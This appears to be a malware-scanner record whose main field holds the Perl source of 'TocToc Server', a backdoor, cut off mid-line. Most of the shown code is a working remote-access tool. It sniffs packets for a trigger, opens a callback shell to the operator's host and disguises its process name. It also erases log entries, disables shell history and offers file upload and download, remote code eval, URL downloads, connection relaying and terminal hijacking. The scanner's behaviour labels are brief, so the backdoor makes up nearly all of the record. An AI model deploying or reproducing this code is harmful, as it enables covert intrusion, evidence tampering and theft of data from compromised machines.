{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "PUT": "May write to a file",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file"
        },
        "macro": "#!/usr/bin/perl\n# TocToc Server 1.7.01-BETA2\n#\n#     0ldW0lf - oldwolf@atrixteam.net\n#             - old-wolf@zipmail.com\n#             - www.atrixteam.net\n#\n#\n#######################################################################\n#######                     CONFIGURATION                       #######\n#######################################################################\nmy $proc_name='TocToc';           # process name                      #\n#---------------------------------#####################################\nmy $pdev = $ARGV[0] || \"\";        # extern interface - if none        #\n                                  # especifyed it will be looked up   #\n#---------------------------------#####################################\nmy $pass = 'CRYPTED PASSWORD';    # Crypted password                  #\n#---------------------------------#####################################\nmy $home = \"/\";                   # HOME directory                    #\n#---------------------------------#####################################\nmy $shell = \"/bin/bash\";          # Shell bin location                #\n#---------------------------------#####################################\nmy @commands = (                  # Commands to be executed before    #\n'cat /etc/issue.net 2> /dev/null',# run $shell you can also use ';'   #\n'id',                             # to separate them, E.g:            #\n'uname -a');                      # my @commands = ('id;uname -a');   #\n#---------------------------------#####################################\nmy @bashrc = (                    # The bashrc lines gonna be written #\n  'alias ls=\\'ls $LS_OPTIONS\\''   # in \"$home/.bashrc before a shell  #\n);                                # be spawned and deleted after it   #\n#---------------------------------#####################################\nmy $max_idle = 40;                # Max. time in minutes a user can   #\n                                  # be idle.                          #\n#---------------------------------#####################################\nmy $pid_file = \"$home/.toc.pid\";  # PID file gonna be written if      #\n                                  # especifyed                        #\n#---------------------------------#####################################\nmy $Hertz = 100;                  # Kernel clock tick rate to convert #\n                                  # the start time of a process into  #\n                                  # the UNIX epoch time. 100 is the   #\n                                  # Linux standard, you can also look #\n                                  # in /usr/include/asm/param.h for   #\n                                  # its value. Not necessary, thougth #\n#---------------------------------#####################################\nmy %WIPE;                         #      - WIPE definetions  -        #\n$WIPE{\"/var/log/messages\"}        # $WIPE{\"some_file\"} = \"what to     #\n= \"obsolete promisc\";             # wipe\";                            #\n                                  # In the TocToc startup the lines   #\n                                  # with words in the key value gonna #\n                                  # be wiped off from the file        #\n#######################################################################\n\n####################################\n# You can change the ENV stuff too #\n####################################\n\n#### ENVironment ####\n$ENV{HOME}       = $home;\n$ENV{PS1}        = '[\\u@\\h \\W]: '; # the way i like :)\n$ENV{MAIL}       = '/var/mail/root';\n$ENV{HISTFILE}   = '/dev/null';\n$ENV{USER}       = 'root';\n$ENV{LOGNAME}    = 'root';\n$ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';\n$ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';\n$ENV{SHELL}      = $shell;\n$ENV{TERM}       = 'xterm';\n#####################\n\n########################################\n# Probably you don\ufffdt wanna change that #\n########################################\n\n# DO NOT ADD SIG{INT} HERE\n###### SIGnals ######\n$SIG{HUP}  = 'IGNORE';\n$SIG{TERM} = 'IGNORE';\n$SIG{CHLD} = sub { wait; };\n#####################\n\n####################################\n### Don\ufffdt make any change unless ###\n### you know what your are doing ###\n####################################\n\nmy $UPTIME = time;\nmy $buffer = 4096;\n$0=$proc_name.\"\\0\";\nmy $pid=fork;\nexit if $pid;\n\nuse Cwd;\nmy $dir = getcwd();\nchdir(\"/\") if ($dir ne '/');\n\n# Modules needed #\nuse Net::RawIP;\nuse IO::Socket;\nuse IO::Pty;\nuse IO::Handle;\nuse IO::Stty;\nuse IO::Socket;\nuse IO::Select;\nuse Term::ReadKey;\nuse LWP::UserAgent;\nuse Time::HiRes;\nuse Sys::Hostname;\n##################\n\n# to use ioctl\neval {\n  require 'sys/ioctl.ph'; \n};\n\nuse strict;\n\nchdir(\"/\");\nif (defined($pid_file) and $pid_file ne '') {\n  open(PID, \"> $pid_file\");\n  print PID \"$$\\n\";\n  close(PID);\n}\nmy $VERSION = \"1.7.01-BETA2\";\n$max_idle *= 60;\nmy $psize = 4096;\nmy $ptout = 64;\nmy $ip = 20;\nmy (%c_ipt, @p, %pd);\n\n$pdev=Net::RawIP::lookupdev($ptout) unless $pdev;\nmy $ifs = ifaddrlist;\nmy $LIP = $ifs->{$pdev};\nmy $pfil = \"tcp and ( dst host $LIP ) or udp and ( dst host $LIP ) or icmp and ( dst host $LIP )\";\n\nmy $c=0;\nmy $p=new Net::RawIP({ip=>{},udp=>{}});\n#my $p=new Net::RawIP();\nmy $okp;\nmy $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);\nmy $offset=Net::RawIP::linkoffset($psck);\nexit if (!$offset);\n\n\npipe(CHILD_RDR, PARENT_WTR);\n\nmy $pid = fork();\nexit if (not defined($pid));\n\nunless ($pid) {\n  if (defined($pid_file) and $pid_file ne '') {\n    open(PID, \">> $pid_file\");\n    print PID \"$$\\n\";\n    close(PID);\n  }\n  my $main_pid = $$;\n  chdir(\"$home\");\n\n  close(PARENT_WTR);\n\n  CHILD_RDR->autoflush(1);\n  my $rdr = new IO::Handle;\n  $rdr->fdopen(fileno(CHILD_RDR), 'r');\n  $rdr->blocking(0);\n\n  my %CLIENT;\n  \n  my $connections = 0;\n\n  my $sel_serv = IO::Select->new();\n  my $sel_shell = IO::Select->new();\n\n  my $rdr_buf = '';\n  while ( 1 ) {\n    if ($connections == 0) {\n      sleep(2); # dont waste cpu when not needed\n    } else {\n       foreach my $cli (keys(%CLIENT)) {\n         my $idle_time = time - $CLIENT{$cli}->{last_msg};\n         finish_client($CLIENT{$cli}->{sock}, \"\\n\\nIdle time exceeded.\\n\\n\") if ($idle_time > $max_idle);\n       }\n    }\n\n\n    if (defined(my $n = $rdr->sysread($rdr_buf, 4096))) {\n      rdr_parse(\"$rdr_buf\");\n      $rdr_buf = '';\n    }\n\n    my @ready = $sel_serv->can_read(0.01);\n    foreach my $fh (@ready) {\n      my $msg;\n      my $nread = sysread($fh, $msg, 4096);\n\n      my $proto_cli;\n      map { $proto_cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{proto} eq $fh) } keys %CLIENT;\n\n      if ($nread == 0) {\n        if (defined($CLIENT{$fh})) {\n          close_client($fh);\n        } elsif (defined($proto_cli)) { \n           close_client($proto_cli);\n        }\n      } elsif (not defined($CLIENT{$fh})) {\n          # protocols messages\n          next unless(defined($proto_cli));\n          parse_msg($proto_cli, $msg);\n      } elsif ($CLIENT{$fh}->{logged} == 1) {\n          $CLIENT{$fh}->{last_msg} = time;\n          write_shell($CLIENT{$fh}->{shell}, $msg);\n      }\n    }\n    my @shell_ready = $sel_shell->can_read(0.01);\n    foreach my $shell (@shell_ready) {\n      read_shell($shell);\n    }\n  }\n\n##############\n# CHILD SUBS #\n##############\n  sub rdr_parse {\n    my $msg = shift;\n    my @lines = split(/\\n/, $msg);\n    foreach my $line (@lines) {\n      if ($line =~ /^CONN (.*)/) {\n        open_conn(split(':',$1));\n      }\n    }\n  }\n\n  sub open_conn {\n    my ($ip, $port) = @_;\n    my $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7) || return(undef);\n    $sock->autoflush(1);\n    $connections++;\n    $sel_serv->add($sock);\n    $CLIENT{$sock}->{sock} = $sock;\n\n    $CLIENT{$sock}->{logged} = 1;\n    $CLIENT{$sock}->{login_time} = time;\n    $CLIENT{$sock}->{last_msg} = time;\n    new_shell($sock);\n\n    # opening the protocol socket\n    my $proto = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7);\n    unless($proto) {\n      write_client($sock, \"\\nShit! The protocol connection could not be estabilished!\\nTry to reconnect.\\n\");\n    } else {\n        $CLIENT{$sock}->{proto} = $proto;\n        $sel_serv->add($proto);\n    }\n  }\n\n  sub read_shell {\n    my $shell = shift;\n    my $cli;\n\n    unlink(\"$home/.bashrc\") if (-e \"$home/.bashrc\"); # here we check and delete \n                                                     # the bashrc file\n\n    my $msg = '';\n    map { $cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{shell} eq $shell) } keys %CLIENT;\n\n    return(undef) unless(defined($cli)); # ???\n\n    my $read = sysread($shell, $msg, $buffer);\n\n    if ($read == 0) {\n      finish_client($cli, \"Terminal closed.\\n\");\n      $shell->close;\n      $sel_shell->remove($shell);\n    } else {\n       write_client($cli, $msg);\n    }\n  }\n\n  sub new_shell {\n    my $cli = shift;\n    my $pty = new IO::Pty;\n\n    my $bashrc_file = \"$home/.bashrc\";\n    $bashrc_file =~ s/^\\/\\//\\//;\n\n    unless ($pty) {\n      finish_client($cli, \"ERRO: There is no device available.\\n\");\n    }\n\n    my $pid = fork();\n    $CLIENT{$cli}->{SHELL_PID} = $pid;\n \n    if (not defined($pid)) {\n      finish_client($cli, \"ERRO: fork()\\n\");\n    }\n\n\n    unless ($pid) {\n \n      $pty->make_slave_controlling_terminal();\n      my $slave = $pty->slave();\n      close $pty;\n\n      $slave->set_raw();\n      unless (open(STDIN,\"<&\". $slave->fileno())) {\n        finish_client($cli,\"Couldn't reopen STDIN for reading.\\n\");\n        exit;\n      }\n      unless (open(STDOUT,\">&\". $slave->fileno())) {\n         finish_client($cli, \"Couldn't reopen STDOUT for writing.\\n\");\n         exit;\n      }\n      unless (open(STDERR,\">&\". $slave->fileno())) {\n        finish_client($cli, \"Couldn't reopen STDERR for writing.\\n\");\n        exit;\n      }\n \n      STDOUT->autoflush(1);\n      STDIN->autoflush(1);\n      STDERR->autoflush(1);\n \n      close $slave;\n\n      ReadMode 0;\n      sleep 1;\n      IO::Stty::stty(\\*STDIN,\"sane\");\n\n      chdir(\"$home\");\n\n      my $command = join(';', @commands);\n      if (defined($command)) {\n        system(\"$command &\"); # '&' to execute it in backgroud\n        sleep(1); # to get the commands answer\n                  # i hope 1 sec is enougth\n      }\n\n      # writing out .bashrc\n      open(BRC, \"> $bashrc_file\");\n      print BRC join(\"\\n\", @bashrc);\n\n      { exec(\"$shell\") };\n\n      syswrite(STDOUT, \"ERRO: exec($shell)\\n\");\n      exit;\n    }\n    $pty->close_slave();\n    $pty->set_raw();\n    $CLIENT{$cli}->{shell} = $pty;\n    $sel_shell->add($pty);\n\n  }\n\n  sub parse_msg {\n    my ($cli, $msg) = @_;\n    my $shell = $CLIENT{$cli}->{shell};\n    my $proto = $CLIENT{$cli}->{proto};\n    if ($msg =~ /\\001T:(.+?)\\s(.*):\\002\\n/) {\n      while ($msg =~ m/\\001T:(.+?)\\s(.*):\\002\\n/g) {\n        my $cmd  = $1;\n        my $arg  = $2;\n        my @args = split(/ +/, $arg);\n        if ($arg eq \"ABORT\") {\n          if ($cmd eq \"DOWNLOAD\") {\n            my $pipe = $CLIENT{$cli}->{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}->{DOWNLOAD_PIPE}));\n            if (defined($pipe)) {\n               print $pipe \"ABORT\\n\";\n               close($pipe);\n               delete($CLIENT{$cli}->{DOWNLOAD_PIPE});\n            }\n#          } elsif ($cmd eq \"OPEN\") {\n#              exit if ($$ != $main_pid);\n          }\n          next;\n        } \n        if ($cmd eq \"TERM_SIZE\") {\n          return() if (not defined($shell) or scalar(@args) != 4);\n\n          eval { SetTerminalSize(@args, $shell); };\n          \n          if (defined($CLIENT{$cli}->{termsize})) { \n            write_client($cli, \"\\nTerminal size has changed.\\n\\n\");\n          }\n          $CLIENT{$cli}->{termsize} = \"@args\";\n\n        } elsif ($cmd eq \"HIJACK\") {\n            my $chars = join(\" \", @args[1 .. $#args]);\n            hijack($proto, $args[0], $chars);\n        } elsif ($cmd eq \"SYSINFO\") {\n            my $hostname = hostname;\n            my %CPU = cpuinfo();\n            my %MEM = meminfo();\n            my $uptime = uptime();\n            my $bd_uptime = stat_time(time-$UPTIME, \"d\");\n            my $cpu_load = sysload();\n            my $OS = ucfirst($^O);\n            my ($received, $sended) = netinfo();\n\n            opendir(PROC, \"/proc\");\n            my @procs = readdir(PROC);\n            closedir(PROC);\n            @procs = grep { $_ ne \".\" and $_ ne \"..\" and $_ =~ /^\\d+$/ } @procs;\n\n            my $procs = scalar(@procs);\n            \n            my $kernel = \"Error: Could not open /proc/version\";\n            open(VER, \"< /proc/version\");\n            my @version = split(/ /, <VER>);\n            close(VER);\n            $kernel = $version[2] if (defined($version[2]));\n\n            my @release_files = (\"vers\ufffdo-conectiva\", \"mandrake-release\", \"redhat-release\", \"debian_version\", \"SuSE-release\", \"slackware-version\", \"release\", \"version\");\n\n            my $release;\n            my $release_file;\n            foreach my $file (@release_files) {\n              if (-e \"/etc/$file\") {\n                $release_file = \"/etc/$file\";\n                last;\n              }\n            }\n\n            unless ($release_file) {\n              opendir(ETC, \"/etc\");\n              my @files = readdir(ETC);\n              closedir(ETC);\n              my ($release_file) = grep { $_ =~ /release|version/ } @files;\n              $release_file = \"/etc/\".$release_file;\n            }\n\n            if ($release_file) {\n              open(REL, \"< $release_file\");\n              $release = <REL>;\n              close(REL);\n            }\n\n            $release = \"Slackware $release\" if ($release_file eq \"/etc/slackware-version\");\n            $release = \"Debian GNU/Linux $release\" if ($release_file eq \"/etc/debian_version\");\n\n            if ($release_file and !(grep { $release_file eq \"/etc/$_\" } @release_files)) {\n              $release = \"Guess $release\" unless(grep { $release_file eq \"/etc/$_\" } @release_files);\n            }\n            $release = \"[$release]\" if ($release ne \"\");\n     \n            $release =~ s/\\n$//;\n\n            my @send = (\n                    \"Hostname:               $hostname\",\n                    \" \",\n                    \"Operation System:       $OS $release\",\n                    \"Kernel version:         $kernel\",\n                    \" \",\n                    \"System UPTime:          $uptime\",\n                    \"BackDoor UPTime:        $bd_uptime\",\n                    \" \",\n                    \"CPUs Number:            \".$CPU{CPUS},\n                    \"CPU Load:               $cpu_load\");\n\n                   \n            for (my $c = 1; $c <= $CPU{CPUS}; $c++) {\n               my $cpun = $c;\n               $cpun = '' if ($c == 1);\n               my $space = \" \" x (3-length($cpun));\n               push(@send, (\"CPU$cpun MHz:             $space\".$CPU{$c}{'cpu MHz'},\n                            \"CPU$cpun Vendor ID:       $space\".$CPU{$c}{'vendor_id'},\n                            \"CPU$cpun Model name:      $space\".$CPU{$c}{'model name'}));\n            }\n\n            push(@send, (\" \",\n                         \"Memory Total:           \".int($MEM{'MemTotal'}/1000).\" MB\",\n                         \"Memory Free:            \".int($MEM{'MemFree'}/1000).\" MB\",\n                         \" \",\n                         \"Running process:        $procs\",\n                         \" \",\n                         \"INet Device:            $pdev\",\n                         \"Received bytes:         $received\",\n                         \"Sended bytes:           $sended\"));\n\n\n\n          foreach my $send (@send) {\n            spm($proto, $cmd, $send);\n          }\n          spm_done($proto, $cmd);\n        } elsif ($cmd eq \"W\") {\n            my %PROC = w_procps();\n\n            spm($proto, $cmd, \"USER          TTY           FROM     LOGGED    IDLE  WHAT\");\n\n            foreach my $cli (keys(%CLIENT)) {\n              my $cli_sock = $CLIENT{$cli}->{sock};\n              my $cli_shell = $CLIENT{$cli}->{shell};\n\n              my $idle = time - $CLIENT{$cli}->{last_msg};\n              my $show_idle = stat_time($idle);\n\n              my $login = time - $CLIENT{$cli}->{login_time};\n              my $show_login = stat_time($login, \"h\");\n              my $ttyname = $cli_shell->ttyname;\n              $ttyname =~ /^\\/dev\\/(.*)/;\n              my $pts = $1;\n\n              my $show_starttime = stat_time((time-$PROC{$ttyname}{starttime}), \"h\");\n \n              my $user = getpwuid($PROC{$ttyname}{UID});\n\n              my $line = $user.(\" \" x (10-(length($user)))).fill_space($pts, 7).fill_space($cli_sock->peerhost, 15).fill_space($show_login, 11).fill_space($show_idle, 8).\"  \".$PROC{$ttyname}{cmd};\n\n               spm($proto, $cmd, $line);\n            }\n            spm_done($proto, $cmd);\n        } elsif ($cmd eq \"VERSION\") {\n            spm_done($proto, $cmd, \"TocToc $VERSION by 0ldW0lf (oldwolf\\@atrixteam.net)\");\n        } elsif ($cmd eq \"GET\") {\n            sendfile($cli, @args);\n        } elsif ($cmd eq \"PUT\") {\n            getfile($cli, @args);\n        } elsif ($cmd eq \"EVAL\") {\n            my $ret = eval \"$arg\";\n            spm_done($proto, $cmd, \"Evaluation returned: $ret\");\n        } elsif ($cmd eq \"SOCKLIST\") {\n            socklist($proto, \"$arg\");\n            spm_done($proto, $cmd);\n        } elsif ($cmd eq \"PWD\") {\n            my $dir = getcwd();\n            spm_done($proto, $cmd, \"$dir\");\n        } elsif ($cmd eq \"LAG\") {\n            spm_done($proto, $cmd, $arg);\n#        } elsif ($cmd eq \"OPEN\") {\n#            sopen($cli, @args);\n#        } elsif ($cmd eq \"OPEN2\") {\n#            sopen2($cli, @args);\n        } elsif ($cmd eq \"OPEN\") {\n            sopen2($cli, @args);\n        } elsif ($cmd eq \"CD\") {\n            if (chdir(\"$arg\")) {\n              my $dir = getcwd();\n              spm($proto, $cmd, \"Changed directory to: $dir\");\n            } else {\n               spm($proto, $cmd, \"I could not change directory to: $arg\");\n            }\n            spm_done($proto, $cmd);\n        } elsif ($cmd eq \"DOWNLOAD\") {\n            my ($url, $file) = @args;\n            my $pwd = getcwd();\n            unless(defined($file)) {\n              $file = $url;\n              $file =~ s/^.*\\/(\\S+)$/$1/;\n            }\n            $file = \"$pwd/$file\";\n            $file =~ s/^\\/\\//\\//;\n\n            unless(open(FILE, \"> $file\")) {\n              spm_done($proto, $cmd, \"Error: Cannot creat $file\");\n              next;\n            }\n\n            close(FILE);\n            unless(download($cli, $url, $file))  {\n              spm_done($proto, $cmd, \"Error: I could not fork() the process.\");\n              next;\n            }\n        } elsif ($cmd eq \"PS\") {\n            my @ps = ps();\n            if (scalar(@ps) == 0) {\n              spm_done($proto, $cmd, \"None hidden procces has been found.\");\n            } else {\n               foreach my $ps (@ps) {\n                 spm($proto, $cmd, \"$ps\");\n               }\n               spm_done($proto, $cmd);\n            }\n        } else {\n           spm_done($proto, $cmd, \"Error: Command \\'$cmd\\' not implemented in this version ($VERSION).\");\n        }\n\n      }\n    }\n  }\n\n  sub netinfo {\n     my ($bytes_in, $bytes_out);\n     open(NET, \"< /proc/net/dev\");\n     while (<NET>) {\n       if (/^.+?$pdev\\:.+?(\\d+)\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+\\d+\\s+(\\d+)/) {\n         $bytes_in = $1;\n         $bytes_out = $2;\n         last;\n       }\n     }\n     close(NET);\n\n     if ($bytes_in < 1024**3) {\n        $bytes_in = sprintf(\"%.02f\",$bytes_in / 1024**2).\" M\";\n     } else {\n        $bytes_in = sprintf(\"%.02f\", $bytes_in / 1024**3).\" G\";\n     }\n     if ($bytes_out < 1024**3) {\n        $bytes_out = sprintf(\"%.02f\",$bytes_out / 1024**2).\" M\";\n     } else {\n        $bytes_out = sprintf(\"%.02f\", $bytes_out / 1024**3).\" G\";\n     }\n\n     return($bytes_in, $bytes_out);\n  }\n\n  sub sysload {\n    open(LOAD, \"< /proc/loadavg\") || return(\"Error: I could not open /proc/loadavg\");\n    my $load = <LOAD>;\n    close(LOAD);\n    $load =~ /^(.+?)\\s+/;\n    return($1);\n  }\n\n  sub uptime {\n    open(UPT, \"< /proc/uptime\") || return(\"Error: I could not open /proc/uptime\");\n    my $uptime = <UPT>;\n    close UPT;\n\n    $uptime =~ /^(.+?)\\s+(.*)/;\n    my $s = int($1);\n    return(stat_time($s, \"d\"));\n  }\n\n  sub meminfo {\n    my %MEM;\n\n    open(MEM, \"< /proc/meminfo\") || return(\"Error: I could not open /proc/meminfo\");\n\n    while (<MEM>) {\n      next unless (/^(.+?)\\:\\s+(\\d+)/);\n      $MEM{$1} = $2;\n    }\n\n    close(MEM);\n    return(%MEM);\n  }\n\n  sub cpuinfo {\n    my %CPU;\n \n    my $cpu_counter = 0;\n    open(CPU, \"< /proc/cpuinfo\") || return(\"Error: I could not open /proc/cpuinfo\");\n \n    while (<CPU>) {\n      if (/^processor/) {\n        $cpu_counter++;\n      } else {\n         next unless (/^(.+?)\\s+\\:\\s+(.*?)\\n$/);\n         $CPU{$cpu_counter}{$1} = $2;\n      }\n    }\n    close(CPU);\n \n    $CPU{CPUS} = $cpu_counter;\n    return(%CPU);\n  }\n\n  sub spm_done {\n     my ($proto, $cmd, $msg) = @_;\n     if (defined($msg)) {\n       spm($proto, $cmd, $msg);\n     }\n     spm($proto, $cmd, \"DONE\");\n  }\n\n  sub spm {\n    my ($proto, $cmd, $ans) = @_;\n    my $send = \"\\001T:$cmd $ans:\\002\\n\";\n    syswrite($proto, $send, length($send));\n  }\n\n  sub ps {\n     my @result;\n\n     opendir(DIR, \"/proc\");\n     my @proc= readdir(DIR);\n     closedir(DIR);\n     @proc = grep { -d \"/proc/\".$_  and $_ =~ /^\\d+$/ } @proc;\n\n     my @ps = `ps ax`;\n     @ps = grep { s/^(|\\s+)(\\d+).*\\n/$2/ } @ps;\n\n     foreach my $pid (@proc) {\n        next if (grep { $_ eq $pid } @ps);\n\n        open(CMD, \"/proc/$pid/cmdline\");\n        my $cmd = <CMD>;\n        close(CMD);\n \n        $cmd =~ s/\\0/ /g;\n        $cmd =~ s/\\s+$//;\n        my $dir = readlink(\"/proc/$pid/cwd\");\n \n        push(@result, \"PID: $pid ($cmd) [$dir]\");\n     }\n     return(@result);\n  }\n\n# THIS FUNCTION WAS REMOVED\n# READ THE CLIENT\n#\n#  sub sopen { \n#    my ($cli, $ip, $port) = @_;\n#    my $proto = $CLIENT{$cli}->{proto};\n#\n#    my $open_sock = IO::Socket::INET->new(PeerAddr => \"$ip\", PeerPort => \"$port\", Timeout => 15);\n#\n#    unless($open_sock) {\n#      print $proto \"\\003FINISHED-I could not connect on $ip:$port\\002\";\n#      return();\n#    }\n#\n#    $open_sock->autoflush(1);\n#    my $pid = fork();\n#\n#    if (not defined($pid)) {\n#       print $proto \"\\003FINISHED-Error on fork()\\002\";\n#    }\n#\n#    unless ($pid) {\n#\n#      my $sel = IO::Select->new($open_sock);\n#      $sel->add($proto);\n#\n#      while ( 1 ) {\n#        foreach my $fh ($sel->can_read(0.1)) {\n#          my $msg;\n#          my $nread = sysread($fh, $msg, $buffer);\n#\n#          if ($nread == 0) {\n#            if ($fh eq $proto) {\n#               $open_sock->close() if ($open_sock);\n#            } else {\n#               print $proto \"\\003FINISHED-Connection closed.\\002\";\n#            }\n#            $sel->remove($proto);\n#            $sel->remove($open_sock);\n#            undef($sel);\n#            exit;\n#          }\n#\n#          if ($fh eq $proto) {\n#             if ($msg =~  /\\001T:.*:\\002\\n/) {\n#               parse_msg($cli, $msg);\n#             } else {\n#                syswrite($open_sock, $msg, length($msg));\n#             }\n#          } else {\n#              syswrite($proto, $msg, length($msg));\n#          }\n#\n#        }\n#      }\n#      exit; # ???\n#    }   \n#\n#  }\n\n  sub sopen2 {\n    my ($cli, $ip, $port, $cli_port) = @_;\n    my $cli_host = $cli->peerhost;\n   \n    my $pid = fork();\n\n    unless($pid) {\n\n      my $sock = IO::Socket::INET->new(PeerAddr => $cli_host, PeerPort => $cli_port, Proto => \"tcp\", Timeout => 15) || exit;\n      $sock->autoflush(1);\n #     print \"conectando cliente $cli_host:$cli_port\\n\"; \n      my $sel = IO::Select->new($sock);\n      my $remote;\n\n      my $go = 0;\n\n      while ( 1 ) {\n        foreach my $fh ($sel->can_read(0.01)) {\n           my $msg;\n           my $nread = sysread($fh, $msg, $buffer);\n\n           if ($nread == 0) {\n              sleep(1);\n              $sel->remove();\n              $sock->close() if ($sock);\n              $remote->close() if ($remote);\n              exit;\n           }\n\n           if ($fh eq $sock) {\n             if ($go == 0) {\n#               print \"conectando -> $ip:$port\\n\";\n               $remote = IO::Socket::INET->new(PeerAddr => $ip, PeerPort => $port, Proto => \"tcp\");\n               unless ($remote) {\n                 print $sock \"I could not connect on $ip:$port\\n\";\n                 $sel->remove();\n                 $sock->close() if ($sock);\n                 exit;\n               }\n               $sel->add($remote);\n               $go = 1;\n             } else {\n                syswrite($remote, $msg, length($msg));\n             }\n           } else {\n               syswrite($sock, $msg, length($msg));\n           }\n        }\n      }\n    }\n  }\n\n  sub hijack {\n    my ($cli, $device, $msg) = @_;\n    unless(open(TTY, \"+>$device\")) {\n      spm_done($cli, \"HIJACK\", \"I could not open tty $device\");\n      return();\n    }\n\n    # i hope it works\n    unless (defined(&TIOCSTI)) {\n      spm($cli, \"HIJACK\", \"WARNING: Trying to define &TIOCSTI, propably 'sys/ioctl.ph' wasn't loaded. Its not recommended to go on, type 'close' or type the last command again ($msg).\");\n      eval 'sub TIOCSTI () {0x5412;}';\n      spm_done($cli, \"HIJACK\");\n      close(TTY);\n      return();\n    }\n\n    $msg .= \"\\n\";\n\n    foreach my $char (split('', $msg)) {\n      spm($cli, \"HIJACK\", \"Hey yo! I couldn't write on $device: $!\")\n      unless (ioctl(TTY, &TIOCSTI, $char));\n    }\n    close(TTY);\n    spm_done($cli, \"HIJACK\");\n  }\n\n  sub getfile {\n     my ($cli, $file, $port) = @_;\n\n     my $pid = fork();\n     return(undef) if (not defined($pid));\n     unless ($pid) {\n       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);\n       exit unless($transfer);\n       $transfer->autoflush(1);\n\n       my $OK = 1;\n       if (-e \"$file\") {\n         syswrite($transfer, \"File already exists.\", 20);\n         $OK = 0;\n       }\n       unless (open(FILE, \"> $file\")) {\n         syswrite($transfer, \"I could not open the file.\", 26);\n         $OK = 0;\n       }\n\n       syswrite($transfer, \"OK\", 2) if ($OK == 1);\n       sleep(1);\n\n       my $msg;\n       my $got_info = 0;       \n       my $bytes = 0;\n\n       while ( 1 ) {\n          my $ready = sysread($transfer, $msg, $buffer);\n          if ($ready == 0) {\n             close(FILE);\n             exit;\n          }\n          if ($got_info == 0) {\n            $got_info = 1;\n            my $pack = pack(\"N\", 0);\n            syswrite($transfer, $pack, length($pack));\n            next;\n          }\n          print FILE $msg;\n          $bytes += length($msg);\n          my $got_bytes = pack(\"N\", $bytes);\n          syswrite($transfer, $got_bytes, length($got_bytes));\n       }\n\n       exit;\n     }\n  }\n\n\n  sub sendfile {\n     my ($cli, $file, $port) = @_;\n\n     my $pid = fork();\n     return(undef) if (not defined($pid));\n     unless ($pid) {\n#       print \"pid forcado\\n\";\n       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);#       print \"opa.. vamu v\\n\";\n       exit unless($transfer);\n#       print \"eh eh conectado\\n\";\n       $transfer->autoflush(1);\n\n       unless (-e \"$file\") {\n          syswrite($transfer, \"File not found.\", 15);\n       }\n       unless (open(FILE, \"< $file\")) {\n         syswrite($transfer, \"I could not open the file.\", 26);\n       }\n\n       my $bytes = (stat(\"$file\"))[7];\n       syswrite($transfer, $bytes, length($bytes));\n\n       my $msg;\n#       print \"humm vo comeca a manda o arkivo\\n\";\n       while ( 1 ) {\n          my $ready = sysread($transfer, $msg, $buffer);\n          if ($ready == 0) {\n            close(FILE);\n            exit;\n          }\n          my $sended_bytes = unpack(\"N\", $msg);\n          seek(FILE, $sended_bytes, 0);\n          my $send_bytes;\n          read(FILE, $send_bytes, 1024);\n          syswrite($transfer, $send_bytes, length($send_bytes));\n       }\n\n       exit;\n     }\n  }\n\n  # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997\n  # adapted for TocToc use\n  sub socklist {\n    my ($proto, $protocol) = @_;\n    undef($protocol) if ($protocol eq \"0\" );\n\n    my $init = 0;\n\n    my %sock_proc;\n    opendir (PROC, \"/proc\") || spm($proto, \"SOCKLIST\", \"Error: Could not open /proc\");\n    for my $f (readdir(PROC)) {\n        next if (! ($f=~/[0-9]+/) );\n        if (! opendir (PORTS, \"/proc/$f/fd\")) {\n            closedir PORTS;\n            next;\n        }\n        for my $g (readdir(PORTS)) {\n            next if (! ($g=~/[0-9]+/) );\n            my $r=readlink(\"/proc/$f/fd/$g\");\n    \n            my ($dev,$ino)=($r=~/^(socket|\\[[0-9a-fA-F]*\\]):\\[?([0-9]*)\\]?$/);\n  \n            if ($dev == \"[0000]\" || $dev == \"socket\") {$sock_proc{$ino}=$f.\":\".$g;}    }\n        closedir PORTS;\n    }\n    closedir PROC;\n\n    sub scheck {\n      open(FILE,\"/proc/net/\".$_[0]) || spm($proto, \"SOCKLIST\", \"Error: Could not open file /proc/net/\".$_[0].\" for reading.\");\n      while (<FILE>) {\n          my @F=split();\n          next if ($F[9]=~/uid/);\n          my @A=split(\":\",$F[1]);\n          my $a=hex($A[1]);\n          my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);\n          my $cmd = \"\";\n          if ($pid && open (CMD,\"/proc/$pid/status\")) {\n             my $l = <CMD>;\n             ($cmd) = ( $l=~/Name:\\s*(\\S+)/ );\n             close(CMD);\n          }\n          if ($init == 0 ) {\n              spm($proto, \"SOCKLIST\", \"type  port      inode     uid    pid   fd  name\");\n              $init = 1;\n          }\n          my $string = sprintf(\"%s %6d %10d  %6d %6d %4d  %s\", $_[0],$a 